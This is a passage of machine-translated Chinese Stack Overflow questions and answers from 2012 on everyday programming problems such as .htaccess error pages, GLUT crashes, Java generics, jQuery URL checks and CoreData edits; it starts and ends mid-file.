        @main.show.active(params)

    @append @nav, @main

module.exports = Posts 
```

# .htaccess - ErrorDocument 不适用于 401 响应

> ID：10772419
> 
> 赞同：0
> 
> 时间：2012-05-27T07:42:19.343
> 
> 标签：.htaccess, redirect

我正在尝试使用 .htaccess 中的重定向重定向到自定义错误页面。请查看网站 jobslanda.com。线路`ErrorDocument 401 401.php`不工作。我在 .htaccess 中使用以下配置：

```
RewriteEngine On
RewriteRule ^([a-zA-Z0-9]+)/([\w.,]+)/([\w.,]+)/([\w.,]+)/([\w.,]+)/([\w.,]+)/([\w.,]+)$ job.php?j=$1
RewriteRule ^([a-zA-Z0-9]+)/([\w.,]+)/([0-9]+)$ sameIndustryJobs.php?i=$1&c=$2&p=$3
RewriteRule ^([a-zA-Z0-9]+)/([a-zA-Z0-9]+)/([\w',]+)/([0-9]+)$ sameCatagoryJobs.php?c=$1&s=$3&p=$4
RewriteRule ^([a-zA-Z0-9]+)/([a-zA-Z0-9]+)/([a-zA-Z0-9]+)/([\w.,]+)/([0-9]+)$ sameCityJobs.php?c=$1&cn=$4&p=$5
RewriteRule ^([a-zA-Z0-9]+)/([a-zA-Z0-9]+)/([a-zA-Z0-9]+)/([a-zA-Z0-9]+)/([\w.,]+)/([0-9]+)$ sameQualificationJobs.php?q=$1&cn=$5&p=$6

ErrorDocument 401 401.php

AddOutputFilterByType DEFLATE text/plain
AddOutputFilterByType DEFLATE text/html
AddOutputFilterByType DEFLATE text/css
AddOutputFilterByType DEFLATE application/javascript
AddOutputFilterByType DEFLATE application/x-javascript 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-28T18:55:29.403

您的网络服务器上的 401.php 文件在哪里？通常，该`ErrorDocument`指令应以 a 开头`/`并引用相对于您的 Web 根目录的页面。

参考： [http ://httpd.apache.org/docs/2.0/mod/core.html#errordocument](http://httpd.apache.org/docs/2.0/mod/core.html#errordocument)

您似乎在以下位置没有页面： `http://jobslanda.com/401.php`

奇怪的是，这`302`会将重定向返回到名为`404.php`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T07:51:10.257

是因为您没有正确拼写**“.htaccess”吗？**（并且您的 Apache 安装没有拾取文件？）

# macos - rabbitmq 上下文用户在哪里

> ID：10772421
> 
> 赞同：0
> 
> 时间：2012-05-27T07:42:41.207
> 
> 标签：macos, erlang, osx-lion, osx-snow-leopard, rabbitmq

`rabbitmq`在mac (lion) 上安装后，文档显示其上下文用户名为`"rabbitmq"`. 尝试通过操作系统的首选项面板的帐户菜单设置命名`"rabbitmq"`用户时，它告诉我该帐户已经建立，不能重复创建。但是在检查`/Users/`目录时，我找不到rabbitmq路径。此外，当检查`/etc/passwd`配置文件时使用`"cat /etc/passwd |grep rabbitmq"`. 但是回复是空白的。

你能告诉我rabbitmq用户在哪里吗？在哪里放置`.erlang.cookie`文件，在哪里放置`'.erlang'`文件。

如果可能，请告诉我哪个源代码文件`rabbitmq-server project`负责创建上下文用户，我真的很想阅读它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T01:17:03.167

我通过自制软件安装了rabbitmq，然后运行了sudo rabbitmq-server。主目录在输出中列出：

```
AMQP 0-9-1 / 0-9 / 0-8
Copyright (C) 2007-2012 VMware, Inc.
Licensed under the MPL.  See http://www.rabbitmq.com/

node           : rabbit@kelly-mac
app descriptor : /usr/sbin/../../opt/rabbitmq/sbin/../ebin/rabbit.app
home dir       : /Users/kjw
config file(s) : (none)
cookie hash    : <somehadh>
log            : /var/log/rabbitmq/rabbit@kelly-mac.log
sasl log       : /var/log/rabbitmq/rabbit@kelly-mac-sasl.log
database dir   : /var/lib/rabbitmq/mnesia/rabbit@kelly-mac
erlang version : 5.9 
```

看起来主目录是根据运行 rabbitmq 的用户设置的。尝试将您的 cookie 和 .erlang 文件放在您的主目录中，看看是否可行。

# objective-c - 使用 CoreData 托管对象添加或编辑的正确方法

> ID：10772423
> 
> 赞同：0
> 
> 时间：2012-05-27T07:42:52.233
> 
> 标签：objective-c, core-data

一个常见的场景是有一个允许添加或编辑底层模型的视图，我们可以简单地使用 a 获取视图，如果为 nil`initWithObject:(MyManagedObject*)object`则创建一个新视图。`object`

现在离开视图时，我们可以询问`ManagedObjectContext`它是否脏，但是我们如何知道它是因为`object`被修改了，还是因为其他`objects`地方可能已经被修改了？

如果我们想为用户提供一个`cancel`选项，如何`rollback`仅对当前进行更改`object`（并删除`object`如果它只是在此视图中新创建的？）

是否建议使用多个`ManagedObjectContext`s？（每个视图一个？——在这种情况下，同步可能会成为一个问题，不是吗？）或者应该使用`UndoManager`? 这可以使用来实现`undoGroups`吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T08:49:03.923

我知道三种常见的方法。当然，我很想听听其他人发布他们是如何处理这个问题的。

**撤消组** 在以模态方式呈现详细视图控制器（带有保存和取消选项）之前，我创建了一个撤消组，然后在托管对象上下文中创建一个托管对象实例并进行初步设置。

在保存和取消的委托方法上，我结束了撤消组，并且通过取消我还做了一个 undoNestedGroup。

好：您可以轻松撤消编辑。坏：如果您不想取消某些操作，那将非常棘手。换句话说，它是一种取消全有或全无的方法。

**手动处理** 这在添加新项目时非常可行，因为很难跟踪单个编辑。这基本上意味着在您的取消委托方法中，您在显示详细视图控制器之前删除了您知道添加的对象。

**草稿上下文** 这意味着您将创建另一个托管对象上下文实例，您可以将其合并回主上下文或丢弃所有更改。正如您所说，合并部分可能会有些痛苦，但它是完全可行的。与接近的撤消组相比，这具有仅合并您保存的更改的好处。因此，虽然仍然有点棘手，但您可以更好地微调，要保留哪些更改以及要取消哪些更改。

在 iOS5 中，Apple 添加了嵌套上下文，您可以在其中轻松创建子上下文以供详细视图控制器使用，也可以保存或丢弃。不需要额外的代码来处理上下文的合并。

好：在你准备好保存之前，你保持你的主要上下文不受所有修改的影响。不好：在 iOS5 之前实现起来更复杂（它引入了很棒的嵌套上下文）。

此致，

斯文。

# html - W3C 验证 - 带有有序列表的换行符

> ID：10772431
> 
> 赞同：0
> 
> 时间：2012-05-27T07:44:17.753
> 
> 标签：html, w3c-validation

我正在使用[W3C HTML 验证](http://validator.w3.org/)来验证我的网站，并且在有序列表中添加换行符时遇到错误。

例如：

```
<ol>
    <li>Stuff</li><br/>
    <li>Stuff2</li><br/>
</ol> 
```

成功验证将打印

1.  东西东西2

但应该是

1.  东西
2.  东西2

如果没有换行符，它可以很好地验证，但列表元素不在单独的行上。有没有一种方法可以让网站验证**WHILE**打破每个`stuff`元素的行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:59:20.007

[`<li>`除了在`<ol>`or内，你不能有任何东西`<ul>`。](http://www.w3.org/TR/html5/the-ol-element.html#the-ol-element)您的 CSS 中的某些内容可能会弄乱您的列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T08:03:07.243

我觉得WOW`<br/>`之间`<li>`。`<li>`本身总是把东西放在下一行..你没有任何东西在`<ol>`except `<li>`，

如果你想在 CSS 中`<li>'s`使用一些额外的差距。`margin`

你怎么说：

> 成功验证将打印
> 
> 1.  东西东西2

不过，这不会发生`<li>`。

# iphone - 在单元格标签上对名称和地址数组进行排序

> ID：10772435
> 
> 赞同：-1
> 
> 时间：2012-05-27T07:44:56.503
> 
> 标签：iphone

我已经搜索了很多，但无法对我的数组 a/c 进行两次排序以满足要求

我使用了这段代码：

```
[array1 sortArrayUsingSelector:@selector(caseInsensitiveCompare:) withPairedMutableArrays:arrForName, arrForAddress, nil]; 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:09:57.100

在 NSArray 类参考中没有`- sortArrayUsingSelector:withPairedMutableArrays:`方法。NSMutableArray 类参考中都没有。如果需要，您可以使用其他方法，例如该`NSMutableArray` `sortUsingSelector:`方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-16T11:53:25.657

将两个数组作为键和值放入字典

```
NSDictionary *dictionary = [NSDictionary dictionaryWithObjects:arrForAddress forKeys:arrForName];
// Sort the first array
NSArray *sortedFirstArray = [[dictionary allKeys] sortedArrayUsingSelector:@selector(compare:)];
// Sort the second array based on the sorted first array
arrForAddress=[[NSMutableArray alloc]init ];
NSArray *sortedSecondArray = [dictionary objectsForKeys:sortedFirstArray notFoundMarker:[NSNull null]]; 
// arrForAddress = [dictionary objectsForKeys:sortedFirstArray notFoundMarker:[NSNull null]]; 
[arrForAddress addObjectsFromArray:sortedSecondArray];
NSLog(@"arrangesort......%@",arrForAddress); 
```

# java - 如何使用采用某种枚举类型的实例的方法创建接口？

> ID：10772436
> 
> 赞同：0
> 
> 时间：2012-05-27T07:45:04.693
> 
> 标签：java, generics, interface, enums

我想到了一个接口，它声明了一种将原始分数从调查转换为特定类别的百分位值的方法，其中类别由多个不相关的枚举类型描述。所以我从这个开始：

```
public interface NormTable<E extends Enum<E>> {
    Integer percentileForRawScore(E e, int score);
} 
```

然后，我得到了一个实现类，例如 Foo 调查及其`Subscale`枚举：

```
public class FooSubscaleNormTable implements NormTable<Subscale> {
    public Integer percentileForRawScore(Subscale e, int score) {
        // Implementation
    }
} 
```

最后，一个用于创建适当具体类的工厂类：

```
public class NormTableFactory {
    public static <E extends Enum<E>> NormTable<E> normTableForSurveyAndType(
        String surveyCode, Class<E> clazz) {
    if ("Foo".equals(surveyCode) && Subscale.class.equals(clazz)) {
        return (NormTable<E>) new FooSubscaleNormTable();
    } else {
            // ...
        }
    }
} 
```

我怀疑那里的演员阵容是错误的，因为 Eclipse 将其标记为未选中，尽管让我继续。然而，构建服务器上的 Java 1.6 编译器并不满意，并将它们标记为不可转换的类型。

我是不是把工厂类的签名弄错了，还是我的整个架构看起来很可疑？我在上面注意到枚举类型是“否则不相关的”，尽管它们都代表调查中的类别，并且可以想象实现一个接口来统一它们的类型。那会有帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:58:02.173

您不应该在声明类型中使用具体的 Enum 类。

使 FooSubscaleNormTable 也通用

```
public class FooSubscaleNormTable<E extends Enum<E>> implements NormTable<E> {
    public Integer percentileForRawScore(E e, int score) {
       if(e instanceof Subscale) {
           switch((Subscale) e) {
           case X:
           // do something
           break;
           }
       }
       // return 0; 
    }
} 
```

并将您的工厂更改为

```
public class NormTableFactory {
    public static <E extends Enum<E>> NormTable<E> normTableForSurveyAndType(
        String surveyCode, Class<E> clazz) {
    if ("Foo".equals(surveyCode) && Subscale.class.equals(clazz)) {
        return (NormTable<E>) new FooSubscaleNormTable<E>();
    } else {
            // whatever else
        }
    }
} 
```

然后，当您调用它时，即传入所需的枚举类型。

```
NormTable<Subscale> scale = NormTableFactory.normTableForSurveyAndType("surveyCode", Subscale.class); 
```

# c++ - Linux下OpenGL中的分段错误

> ID：10772439
> 
> 赞同：0
> 
> 时间：2012-05-27T07:45:24.150
> 
> 标签：c++, opengl, segmentation-fault

我正在关注一些教程并提出以下代码：

```
// rendering.cpp

#include "rendering.h"
#include <GL/gl.h>
#include <GL/freeglut.h>

void DrawGLScene()
{
    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
    glLoadIdentity();
}

int InitGL(int argc, char** argv)
{
    /*glShadeModel(GL_SMOOTH);
    glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
    glClearDepth(1.0f);
    glEnable(GL_DEPTH_TEST);
    glDepthFunc(GL_LEQUAL);
    glHint(GL_PERSPECTIVE_CORRECTION_HINT, GL_NICEST);*/

    glutInit(&argc, argv);
    glutInitWindowSize(500, 500);
    glutInitWindowPosition(100, 100);
    glutDisplayFunc(DrawGLScene);
    glutCreateWindow("Swimming Simulation");
    glutMainLoop(); // Enter GLUT's main loop

    return true;
} 
```

我的 main 函数非常简单，只调用该函数：

```
#include "rendering.h"

int main(int argc, char** argv)
{
    InitGL(argc, argv);
    return 0;
} 
```

我正在使用以下命令进行编译：

```
g++ -Wall -g swim.cpp rendering.cpp -lglut -lGLU -o swim 
```

运行`swim`按预期创建一个窗口。但是，如果我取消注释 中的行`InitGL`，则在运行程序时会出现分段错误：

```
(gdb) r
Starting program: <dir> 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x000000335ca52ca7 in glShadeModel () from /usr/lib64/libGL.so.1
Missing separate debuginfos, use: debuginfo-install freeglut-2.6.0-6.fc15.x86_64 glibc-2.14.90-24.fc16.6.x86_64 libX11-1.4.3-1.fc16.x86_64 libXau-1.0.6-2.fc15.x86_64 libXdamage-1.1.3-2.fc15.x86_64 libXext-1.3.0-1.fc16.x86_64 libXfixes-5.0-1.fc16.x86_64 libXi-1.4.5-1.fc16.x86_64 libXxf86vm-1.1.1-2.fc15.x86_64 libdrm-2.4.33-1.fc16.x86_64 libgcc-4.6.3-2.fc16.x86_64 libstdc++-4.6.3-2.fc16.x86_64 libxcb-1.7-3.fc16.x86_64 mesa-libGL-7.11.2-3.fc16.x86_64 mesa-libGLU-7.11.2-3.fc16.x86_64
(gdb) backtrace
#0  0x000000335ca52ca7 in glShadeModel () from /usr/lib64/libGL.so.1
#1  0x0000000000401d67 in InitGL (argc=1, argv=0x7fffffffe198)
    at rendering.cpp:25
#2  0x0000000000401c8c in main (argc=1, argv=0x7fffffffe198) at swim.cpp:37 
```

我应该在这里做什么才能让我的程序运行而不会崩溃？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-27T08:02:32.833

你陷入了一个棘手的 GLUT 陷阱。GLUT 是一种类似于 OpenGL 的状态机（它不是 OpenGL 的一部分）。并且必须在创建或选择窗口后设置回调函数。在您的情况下，`glutDisplayFunc`在调用`glutCreateWindow`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-27T08:38:22.880

摆脱过剩，使用更好的东西，比如 GLFW，而且很多这些功能都被弃用了，所以使用像 [http://www.opengl-tutorial.org/](http://www.opengl-tutorial.org/) 或 [http://ogldev.atspace.co.uk/这样的现代教程](http://ogldev.atspace.co.uk/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T07:49:18.323

只有在存在 OpenGL 上下文时才能调用 OpenGL 函数 - 如果您使用 GLUT，则在调用 glutCreateWindow 函数之后。

但他们不应该让应用程序崩溃......

# java - 哪个 Java 状态机框架有功能性的可视化 eclipse-3.7 编辑器？

> ID：10772443
> 
> 赞同：1
> 
> 时间：2012-05-27T07:45:59.253
> 
> 标签：java, frameworks, eclipse-plugin, code-generation, fsm

似乎有一些带有 Unimod 和 Apache SCXML 等编辑器的 Java FSM 框架，但前者在 eclipse-3.7 上存在问题，而后者甚至没有发布。作为第二种可能性，我会使用独立的可视化编辑器——但这个问题是关于如果你是 eclipse-3.7 用户，是否有这样一个带有合适的编辑器插件的框架。它将应用于桌面 GUI 应用程序设置。

那么，哪个 Java 状态机框架有功能性的可视化 eclipse-3.7 编辑器呢？

# jquery - 检查存储在变量中的 url 到当前 url

> ID：10772447
> 
> 赞同：0
> 
> 时间：2012-05-27T07:46:43.267
> 
> 标签：jquery, url, location, href, attr

我不知道为什么这不起作用：

```
var myurl = "http://domain.com";
var currenturl = $(location).attr('href');
if (myurl == currenturl) {
... 
```

myurl 和 currenturl 都是一样的，但是 if 语句中的脚本没有被执行。

编辑：

```
$(document).ready(function(){
var myurl = "http://domain.com";
var currenturl = window.location.href;
//alert(currenturl);
    if (myurl === currenturl) {
        alert('should see this');
    } else {
    }
}); 
```

解决方案：

```
$(document).ready(function(){
var myurl = "http://domain.com/"; // see the slash at the end
    if (myurl == location.href) {
        alert('that ss the same page');
    } else {
    }
}); 
```

有什么建议吗？比。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T07:56:45.820

您不必为此使用 jQuery，只需：

```
if (myurl == location.href) {
    // the same
} 
```

如果这不起作用，请通过调试它们的值来确保它们相同：

```
console.log(myurl, location.href); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T07:56:16.507

这无论如何都行不通，因为你不能像这样比较 JavaScript 中的对象。$(location) 几乎可以肯定是未定义的事实将是一个问题。请参阅：[JavaScript 中的对象比较](https://stackoverflow.com/questions/1068834/object-comparison-in-javascript)

如果您使用的是本地文件，则应在 URL 中添加“file://”

```
<html>
<script src="https://www.google.com/jsapi"></script>
<script>
google.load('jquery', '1.7.2');
</script>

<script>

$(document).ready(function(){
var myurl = "file://somedir/test.html";
var currenturl = window.location.href;
//alert(currenturl);
    if (myurl === currenturl) {
        alert('should see this');
    } else {
        alert ('see other thing');
    }
});

</script>
<body>
hi
</body>
</html> 
```

# java - 算术与布尔运算（在性能方面）

> ID：10772448
> 
> 赞同：-3
> 
> 时间：2012-05-27T07:46:52.900
> 
> 标签：java, performance, logic, discrete-mathematics

因此，假设我有一个名为 的数字`num`，如果发生某种情况 A，则将该数字增加 1，否则将其减少。

我可以这样写代码：

```
if (A) ++num;
else --num; 
```

这段代码也可以在没有任何 if-else 的情况下编写，但会涉及更多的算术（只是简单的基本算术，没有指数、对数或任何需要科学计算器才能完成的事情！）像这样：

```
num = num * x + y; 
```

问题是，第一个或第二个代码块会执行得更快吗？（这是在Java中，顺便说一句）。

（请不要说它没有任何区别。这只是我正在尝试做的非常“基本”的版本。但是假设有一个非常好的分析器可以测量这两者之间的运行时差异，哪个会更快？）

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T08:00:13.547

这种优化没有多大意义，而且大多数时候都是邪恶的，尤其是在 Java 虚拟机中，它具有 JIT 并优化了字节码。

***尽可能保持代码的可读性，不要担心这种优化......***

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-27T07:59:00.260

答案是它取决于上下文以及*平台上*JIT 编译器优化代码的能力。

*   它可能不会对您的应用程序的性能产生明显的影响。

*   即使是这样，我们也无法预测它会产生什么不同，因为它取决于您的平台（例如，取决于您使用的特定 JVM/版本）以及周围的代码。

最好的建议是编写代码只是为了给优化器最好的机会来完成它的工作。然后，如果性能是一个问题，请分析您的应用程序并查看热点在哪里，并优化热点。仅当分析器说它是热点时才优化*此代码。*

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T08:18:10.733

分支的成本可能比算术指令高 10 倍或更多，这毫无价值。当重复使用分支的同一侧时，处理器可以将成本降低到几乎为零，但是当分支的一侧发生变化时，这可能会花费大约 100 个时钟周期。（给定一个 ++ 或 -- 可能只是一个时钟周期，这很重要）

# xml - setName 函数 (AS 3.0) 是否更改 XML 文件？

> ID：10772449
> 
> 赞同：0
> 
> 时间：2012-05-27T07:47:00.487
> 
> 标签：xml, actionscript-3, flash-cs5

我对通过 Flash 和 Action Script 3.0 处理 xml 文件很陌生。我编写这段代码的目的是将所有 QUESTION 子项更改为 WRONG。

```
var urlRequest:URLRequest = new URLRequest("question.xml");
        var urlLoader:URLLoader = new URLLoader();
        urlLoader.dataFormat = URLLoaderDataFormat.TEXT;
        urlLoader.addEventListener(Event.COMPLETE, urlLoader_complete, false, 0, true);
        urlLoader.load(urlRequest);

    private function urlLoader_complete(e:Event):void {
        var question:XML = new XML(e.target.data);
        question.QUESTION.setName("WRONG");
        trace("FINISH!");
    } 
```

程序运行，我成功地跟踪到了 Finish 这个词。但是，当我检查 xml 文件 question.xml 时，没有一个 QUESTION 子项被重命名。

有人可以为我解释一下吗？

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T08:11:22.397

`setName`是正确的方法，但在您的示例中，您不是在单个节点上使用它，而是在返回的 XMLList 上使用它`question.QUESTION`- 从技术上讲，它不会出现在 XML 树中，因此不会反映XML 输出。

您需要遍历实际节点以获得结果：

```
var question:XML = <QUESTIONS><QUESTION /><QUESTION /></QUESTIONS>;
var questions:XMLList = question.QUESTION;
for each( var node:XML in questions )
    node.setName( "WRONG" );
trace ( question ); // output: <QUESTIONS><WRONG /><WRONG /></QUESTIONS> 
```

或者对于单个节点：

```
var question:XML = <QUESTIONS><QUESTION /></QUESTIONS>;
var questions:XMLList = question.QUESTION;
questions[0].setName( "WRONG" );
trace ( question ); // output: <QUESTIONS><WRONG /></QUESTIONS> 
```

# c# - Lambda 性能杀手

> ID：10772452
> 
> 赞同：1
> 
> 时间：2012-05-27T07:47:14.633
> 
> 标签：c#, performance, linq, lambda

我想知道如果 C# 是性能杀手，为什么 C# 会提供 lambda 表达式？

尝试运行以下命令：

```
Stopwatch sw = new Stopwatch();
 sw.Start();
 x = x.Select((int i) => i += 1).ToArray();
 sw.Stop();
 Console.WriteLine(sw.ElapsedTicks); 
```

和

```
Stopwatch sw = new Stopwatch();
sw.Start();
for (int j = 0; j < 1000; j++) y[j] += 1;
sw.Stop();
Console.WriteLine(sw.ElapsedTicks); 
```

对于 x = 1000，我们会发现巨大的差异。

**lambda 有合适的用例吗？**

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-27T07:52:17.237

您使用 lambda 表达式的代码将`x`其所有 1000 个元素获取并复制到一个新数组中，为它们的所有 1000 个值计算新值。这显然比就地修改同一个数组中的 1000 个现有元素更昂贵。

> 怎么做才对！

简单：将 LINQ 和委托用于正确的目的。我不会使用 LINQ 来获取一组数字并递增其所有值。

仅仅因为 C# 提供了 lambda（它们实际上是委托和表达式树的语法糖），并不意味着您必须将它们用于所有事情。如果您将它们用于正确的目的，您会注意到它们不会对性能造成任何实际影响，至少不会像您所观察到的那样令人震惊。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T09:27:11.270

我想我们必须记住 LINQ 是一种用于查询的语言。当然，你也可以用它做其他事情，比如更新一个集合（一个在 SO 上经常被问到的方法）或运行一个循环，但你为什么要这样做呢？LINQ 和 lambda 表达式并不是过程式编程的全新的完全替代品，它只是一个可以在合适的时候使用的工具。
与其他查询语言（例如 t-sql）一样，LINQ 为您提供工具来定义您想要获取的内容，而不是您想要获取的方式，这还允许您创建一种语言独立的查询，您可以稍后使用解析为任何你想要的。在许多情况下使用它可能非常方便和通用，并且还可以抽象底层数据类型/数据源，但这也意味着您将 HOW 的具体实现留给为您的查询编写解析器的人.
我建议您阅读那里的一些示例 linq 提供程序。以 LINQ to LDAP 为例：作为开发人员，此类提供程序允许您只专注于您想要的数据，而不是底层数据结构/Active Directory API，后者使用起来可能很烦人。
与您获得的所有其他工具一样，您需要问自己想要获得什么，以及该工具是否是最好的方法。一个很好的类比是在 sql servre 查询中使用循环；当然，它可以完成，但您通常更喜欢构建一个选择，让 sql 引擎决定如何执行您的查询。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T10:24:32.053

> 如果 C# 是性能杀手，为什么 C# 会提供 lambda 表达式？

因为与可读代码的重要性相比，性能通常并不重要。

# validation - cakephp 日期验证

> ID：10772453
> 
> 赞同：0
> 
> 时间：2012-05-27T07:47:29.730
> 
> 标签：validation, cakephp, date

在 cakePHP 中，将验证语句放在控制器中时如何实现日期验证。我可以在第一个验证语句之后放置第二个 if 语句吗？我不知道你如何让它验证系统日期早于或等于到期日

```
if($this->Invoice->validates(array('fieldList'=>array('Relationship.partyone','Relationship.active'))))
{
  $this->Invoice->create(); 
 if ($this->Invoice->saveAll($this->request->data,array('validate'=>false))) 
 { 
  $this->Session->setFlash('The invoice has been saved'); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:05:37.197

可能您需要自定义验证以进行日期日期比较

**在模型中**

```
var $validate = array(
        'date' => array(
        'rule' => array('datevalidation', 'systemDate' ),
        'message' => 'Current Date and System Date is mismatched'
            )
        ); 

 function datevalidation( $field=array(), $compare_field=null ) 
    {
        if ($field['date'] > $compare_field)
        return TRUE;
        else return FALSE;
    } 
```

**在控制器中**

```
if($this->Invoice->validates(array('fieldList'=>array('Relationship.partyone','Relationship.active',Relationship.date)))) 
```

# c# - 基于 2D 瓦片的碰撞检测

> ID：10772462
> 
> 赞同：1
> 
> 时间：2012-05-27T07:48:34.210
> 
> 标签：c#, xna, 2d, collision-detection

我一直在计划一个独立游戏项目。我会为你总结一下，这样我就可以直接回答这个问题了。

它完全是通过 Visual Studio 使用最新版本的 XNA 完成的。希望把它放在360和PC上，但我现阶段只是在寻找面向PC的解决方案。

这是一款 2D 横向卷轴射击游戏（想想 Metroidvania 风格，甚至是泰拉瑞亚）。它最终将包括一个游戏内地图编辑器，其中地图基于图块 (16x16)。将有向上和向下滚动。我希望在开发地图编辑器中实现瓦片层（开发地图编辑器的原因是它将严重倾向于以内容为中心，因此会有很多地图）。

物理瓷砖将非常简单，只有两种主要类型。方块瓷砖，它只是一个实心瓷砖，以及有角度的瓷砖，它们是具有角色可以行走的倾斜度的瓷砖。我强烈考虑完全放弃有角度的瓷砖，但还不确定。

角色/NPC 动作会很简单。左右移动、跳跃、坠落、飞行（使用适当的物品/情况）、传送。一切都是静态的，不需要动态物理。只有基本重力。当一个角色离开瓷砖的边缘时，它会掉下来。当它跳跃并且上面有一块瓷砖时，它会停下来并回落。当它到达一个突出的瓷砖/墙壁时，它不能进一步移动，除非它跳过或飞行。所有基本的东西。

弹丸也会受到重力的影响，在某些情况下，弹丸可能会在飞行中被操纵，但不需要重物理。一些射弹也会移动角色（想想一个简单的“推动”机制）。

**所以这里有一个问题：**我正处于开始研究运动和碰撞检测的阶段，但我无法让自己走上解决这些问题的道路。我需要确定角色、瓷砖和弹丸何时发生碰撞的方法。鉴于我所说的关于我所追求的风格和我正在使用的基于图块的系统，我**能否获得一些建议+链接到其他人在类似情况下使用的一些经过验证的真实碰撞检测方法？**我最需要的是灵感。

*只是一个简短的说明，我有几年的程序员经验，所以我不是一个完全的新手:)*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:59:15.060

我在某个时候从事一个 GIS 项目，我遇到了一个类似的问题，我用 QuadTrees 解决了这个问题，请查看此[链接](http://lab.polygonal.de/?p=202)以获得很好的解释和示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-05T06:29:16.840

如果它是您所说的基于图块的地图，那么图块将存储在二维数组中。因此，您可以通过地图数组中的 x,y 坐标快速访问图块。

我对四叉树的建议是只检查实体附近的图块。

例如，您有一个玩家实体向右移动（+x 方向），而不是向上或向下移动。您可以碰撞的瓷砖数量将只是少数瓷砖之一。特别是您右侧的瓷砖。如果你移动得足够快，也许更靠右。

上述仅检查相邻图块的解决方案是解决此问题的一种非常常见的方法，并且可以适用于许多用例。这也比上面提到的四叉树查找更快更简单。

# pdf - gnuplot - pdf 终端 - 设置 unicode 字符（太阳质量符号/点）

> ID：10772470
> 
> 赞同：8
> 
> 时间：2012-05-27T07:49:46.883
> 
> 标签：pdf, unicode, latex, gnuplot, cairo

我正在尝试`\odot`在 gnuplot (4.6.0) pdf 终端中设置 LaTeX 符号。确切的语法是什么？

gnuplot [FAQ](http://www.gnuplot.info/faq/faq.html#SECTION000810000000000000000)提供了一些线索，但我应该键入`{/Symbol \2299}`, 或`{/utf8 \2299}`, 或其他一些变体`\`,`/`等`#`吗？还是我应该做`set encoding utf8`？直接粘贴符号似乎不起作用。

我应该使用 pdf 还是 pdfcairo 作为终端？后者以无法忍受的方式影响了我的情节。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-27T13:46:18.947

这是使用`epslatex`终端的一种方式。在 gnuplot 或 gnuplot 脚本中运行这些命令：

```
set terminal epslatex standalone color
set output 'plot.tex'

set xlabel '$\odot$ is a \LaTeX symbol.'
plot sin(x) 
```

然后就可以`pdflatex`对生成的运行了`plot.tex`，或者`latex`后面跟着`dvipdf`。如果您不介意将 LaTeX 用作绘图中所有文本的解释器，则此方法可以正常工作。如果您只想***包含***符号`\odot`，我不知道该怎么做。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T18:25:44.563

这很简单。首先需要选择支持Unicode的终端；那么你确实可以直接粘贴你的Unicode字符。正如您所发现的，旧的 pdf 终端不支持 Unicode，但更新的 pdfcairo 支持。你说它弄乱了你的图表，但是怎么办？我发现它产生了相同的结果，但质量更好（更流畅的线条、抗锯齿和 Unicode！）。

每个人都安装了不同的终端。其他可能在您的系统上支持 Unicode 的终端是 pngcairo 和 svg。后者是矢量格式，如pdf。如果您需要 pdf 作为最终文件并且 pdfcairo 不适合您，请使用其他可以处理 Unicode 并转换文件的东西。如果您想要出色的标签和数学装饰，LaTeX 解决方案最终是最好的，但要控制输出，您需要精通 LaTeX。

# vb.net - 十六进制对应的ASCII值

> ID：10772472
> 
> 赞同：0
> 
> 时间：2012-05-27T07:50:04.927
> 
> 标签：vb.net, hex, ascii

以下行不会向文件 ascii.txt 写入任何内容。尝试编写十六进制“88”的ascii等价物。但是没有任何内容写入文件，也没有任何内容分配给变量 ascii。

```
Dim ascii = ChrW(Convert.ToInt32("88", 16))
My.Computer.FileSystem.WriteAllText("e:\ascii.txt", ascii, True) 
```

在 excel 或 openoffice 中，您可以使用以下公式获得等效的 ascii。代码有什么问题？

```
=CHAR(HEX2DEC("88")) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T07:54:01.413

`ChrW`不知道 ASCII，它只知道 Unicode 代码点。

[U+0088](http://www.fileformat.info/info/unicode/char/88/index.htm)是一个控制字符，它是不可打印的（即它通常不对应于一个可显示的字符）。因此，文件显示为空也就不足为奇了。

此外，即使`ChrW`使用 ASCII，字符 0x88*也不*是ASCII，它超出了它的范围。如果您谈论的是以前的标准 Windows 字符集，代码页 1252，您可以使用以下代码来检索字符代码的字符串表示形式：

```
Dim bytes = New Byte() { &H88 }
Dim text = System.Text.Encoding.GetEncoding(1252).GetString(bytes) 
```

# c# - Windows Phone 7 - C# 如何解析多维 JsonArray？

> ID：10772474
> 
> 赞同：1
> 
> 时间：2012-05-27T07:51:25.273
> 
> 标签：c#, windows-phone-7, facebook-c#-sdk, arrays

